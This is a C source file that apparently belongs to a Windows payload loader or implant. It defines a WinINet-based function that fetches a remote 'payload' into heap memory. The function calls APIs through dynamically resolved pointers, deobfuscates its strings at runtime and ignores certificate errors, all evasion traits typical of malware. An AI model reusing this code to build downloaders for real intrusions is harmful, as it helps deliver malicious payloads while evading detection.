#include <Windows.h>
#include <wininet.h>
#include "utils/web_requestor.h"
#include "utils/winapi.h"
#include "constants.h"
#include "utils/buffer.h"

/*
Send a web request
Example: SendWebRequest(FALSE, "GET", "127.0.0.1", 8080, "/test/path/1", "HTTP-X-AUTH: base64dummy1", &pResponseBuffer, &numOfBytesRead, 256);
NOTE: Response buffer must be freed manually with HeapFree()
*/
DWORD SendWebRequest(WinApiCustom *pWinApiCustom, IN BOOL isHttps, IN PCHAR verb, IN PCHAR host, IN DWORD port, IN PCHAR urlPath, IN PCHAR additionalHeaders, OUT LPVOID *pResponseBuffer, OUT PDWORD pResponseSize, IN DWORD chunkSize)
{
    HINTERNET hInternet = NULL;
    HINTERNET hInternetConnect = NULL;
    HINTERNET hHttpOpenRequest = NULL;
    DWORD LastError = 0;
    LPVOID addrPayloadChunk = NULL;

    try
    {

        // Open internet handle
        static CHAR strHttpUserAgent[STRING_HTTP_USER_AGENT_LEN + 1] = "";
        DeobfuscateUtf8String(
            (PCHAR)STRING_HTTP_USER_AGENT,
            STRING_HTTP_USER_AGENT_LEN,
            strHttpUserAgent);
        hInternet = pWinApiCustom->loadedFunctions.InternetOpenA(
            strHttpUserAgent, // User-Agent
            INTERNET_OPEN_TYPE_PRECONFIG,
            NULL,
            NULL,
            NULL);
        if (hInternet == NULL)
        {
            LastError = pWinApiCustom->loadedFunctions.GetLastError();
            goto CLEANUP;
        }

        // Connect to HTTP server host
        hInternetConnect = pWinApiCustom->loadedFunctions.InternetConnectA(
            hInternet,
            host, // Host
            port, // Port
            NULL,
            NULL,
            INTERNET_SERVICE_HTTP,
            NULL,
            NULL);
        if (hInternetConnect == NULL)
        {
            LastError = pWinApiCustom->loadedFunctions.GetLastError();
            goto CLEANUP;
        }

        // Open handle to request
        static CHAR strAcceptTypeText[STRING_HTTP_ACCEPT_TYPE_TEXT_LEN + 1] = "";
        DeobfuscateUtf8String(
            (PCHAR)STRING_HTTP_ACCEPT_TYPE_TEXT,
            STRING_HTTP_ACCEPT_TYPE_TEXT_LEN,
            strAcceptTypeText);

        PCSTR acceptTypes[] = {strAcceptTypeText, NULL};
        hHttpOpenRequest = pWinApiCustom->loadedFunctions.HttpOpenRequestA(
            hInternetConnect,
            verb,    // Verb
            urlPath, // URL path
            NULL,
            NULL,        // Referrer
            acceptTypes, // Accept-Types
            INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD | (isHttps ? INTERNET_FLAG_SECURE : 0),
            NULL);
        if (hHttpOpenRequest == NULL)
        {
            LastError = pWinApiCustom->loadedFunctions.GetLastError();
            goto CLEANUP;
        }

        // Send request
        BOOL isSendRequestSuccessful = pWinApiCustom->loadedFunctions.HttpSendRequestA(
            hHttpOpenRequest,
            additionalHeaders, // Additional headers
            -1L,               // Auto-calculate additional headers size
            NULL,              // POST data buffer
            0                  // size of POST data buffer
        );
        if (!isSendRequestSuccessful)
        {
            LastError = pWinApiCustom->loadedFunctions.GetLastError();
            goto CLEANUP;
        }

        // Get response
        HANDLE hHeap = pWinApiCustom->loadedFunctions.GetProcessHeap();
        DWORD numberOfBytesReadChunk;
        addrPayloadChunk = pWinApiCustom->HeapAllocCustom(chunkSize);
        if (addrPayloadChunk == NULL)
        {
            LastError = pWinApiCustom->loadedFunctions.GetLastError();
            goto CLEANUP;
        }
        while (pWinApiCustom->loadedFunctions.InternetReadFile(hHttpOpenRequest, addrPayloadChunk, chunkSize, &numberOfBytesReadChunk))
        {
            // If read chunk is zero, reading is done
            if (numberOfBytesReadChunk == 0)
            {
                break;
            }

            // If read chunk is less than max chunk size, that means it's end of data. If it's equal, there might be more data to read.
            else if (numberOfBytesReadChunk <= chunkSize)
            {
                // If payload buffer is null, it's first time for allocation
                if (*pResponseBuffer == NULL)
                {
                    // Allocate memory from heap
                    *pResponseBuffer = pWinApiCustom->HeapAllocCustom(numberOfBytesReadChunk + 1);
                    if (*pResponseBuffer == NULL)
                    {
                        LastError = pWinApiCustom->loadedFunctions.GetLastError();
                        goto CLEANUP;
                    }

                    // Write fetched data to buffer
                    CopyBuffer(
                        *pResponseBuffer,
                        addrPayloadChunk,
                        numberOfBytesReadChunk);
                }

                // If payload buffer is not null, buffer needs reallocation
                else
                {
                    // Reallocate additional memory
                    *pResponseBuffer = pWinApiCustom->HeapReAllocCustom(*pResponseBuffer, *pResponseSize + numberOfBytesReadChunk + 1);
                    if (*pResponseBuffer == NULL)
                    {
                        LastError = pWinApiCustom->loadedFunctions.GetLastError();
                        goto CLEANUP;
                    }

                    // Write fetched data to buffer after the already stored data
                    CopyBuffer(
                        (LPVOID)((DWORD64)(*pResponseBuffer) + (DWORD64)(*pResponseSize)),
                        addrPayloadChunk,
                        numberOfBytesReadChunk);
                }

                // Increment total number of bytes read
                *pResponseSize += numberOfBytesReadChunk;

                // End if there's no more data to read
                if (numberOfBytesReadChunk < chunkSize)
                {
                    break;
                }
            }
        }
    }
    catch (...)
    {
        LastError = pWinApiCustom->loadedFunctions.GetLastError();
        goto CLEANUP;
    }

    // Cleanup
CLEANUP:
    // Close open handles
    if (hHttpOpenRequest != NULL)
        pWinApiCustom->loadedFunctions.InternetCloseHandle(hHttpOpenRequest);
    if (hInternetConnect != NULL)
        pWinApiCustom->loadedFunctions.InternetCloseHandle(hInternetConnect);
    if (hInternet != NULL)
        pWinApiCustom->loadedFunctions.InternetCloseHandle(hInternet);

    // Free buffer
    if (addrPayloadChunk != NULL)
        pWinApiCustom->HeapFreeCustom(addrPayloadChunk);

    // Required to close connection fully TODO
    //pWinApiCustom->loadedFunctions.InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

    // Return any error; 0 if no error
    return LastError;
}
